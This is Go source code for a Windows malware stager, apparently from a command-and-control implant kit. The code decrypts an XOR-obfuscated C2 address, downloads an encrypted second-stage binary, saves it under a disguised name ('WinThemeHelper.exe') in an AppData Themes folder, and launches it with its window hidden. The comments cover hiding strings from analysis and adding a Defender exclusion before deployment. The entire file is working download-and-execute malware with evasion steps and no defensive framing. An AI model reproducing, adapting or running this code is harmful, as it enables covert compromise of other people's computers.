//go:build windows

package main

import (
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

// ── Build-time variables (set via -ldflags -X) ────────────────────────────────
//
// StagerKey  : XOR key used to decrypt C2Crypt at runtime.
//              Garble encrypts this string literal in the binary — it never
//              appears in plaintext in the EXE on disk.
//
// C2Crypt    : Hex-encoded XOR-encrypted C2 base URL.
//              Generate with:
//                python3 scripts/encrypt_c2.py http://10.0.0.208:9000 c3p0stgr
//
// DropName   : Filename the stage-1 payload is saved as inside DropDir.
//
// DropDir    : Optional override for the drop directory.
//              Default: %APPDATA%\Microsoft\Windows\Themes\
//              (Add a Defender exclusion for this path before deploying.)

var (
	StagerKey = "c3p0stgr"
	C2Crypt   = ""
	DropName  = "WinThemeHelper.exe"
	DropDir   = ""
)

func main() {
	c2 := resolveC2()
	if c2 == "" {
		return // no C2 URL — silent exit
	}

	dest := dropDir()
	os.MkdirAll(dest, 0755)
	agentPath := filepath.Join(dest, DropName)

	// Try to fetch fresh stage-1 from C2
	payload := fetchStage1(c2)

	if len(payload) > 1024 {
		// Persist it to the exclusion-protected path
		if err := os.WriteFile(agentPath, payload, 0755); err == nil {
			launch(agentPath)
			return
		}
	}

	// Download failed or too small — try launching whatever is already cached
	if _, err := os.Stat(agentPath); err == nil {
		launch(agentPath)
	}
}

// resolveC2 decodes the XOR-encrypted C2 URL from the build-time constant.
// With garble, StagerKey and C2Crypt are encrypted literals — they never
// appear as plaintext strings in the binary on disk.
func resolveC2() string {
	if C2Crypt == "" {
		return ""
	}
	b, err := hex.DecodeString(C2Crypt)
	if err != nil {
		return ""
	}
	key := []byte(StagerKey)
	for i := range b {
		b[i] ^= key[i%len(key)]
	}
	return string(b)
}

// fetchStage1 downloads the XOR-encrypted agent binary from C2 and decrypts it.
func fetchStage1(c2 string) []byte {
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Get(c2 + "/stage1")
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()

	enc, err := io.ReadAll(resp.Body)
	if err != nil || len(enc) == 0 {
		return nil
	}

	// XOR decrypt with the same key
	key := []byte(StagerKey)
	for i := range enc {
		enc[i] ^= key[i%len(key)]
	}
	return enc
}

func dropDir() string {
	if DropDir != "" {
		return DropDir
	}
	return filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes")
}

func launch(path string) {
	cmd := exec.Command(path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
}
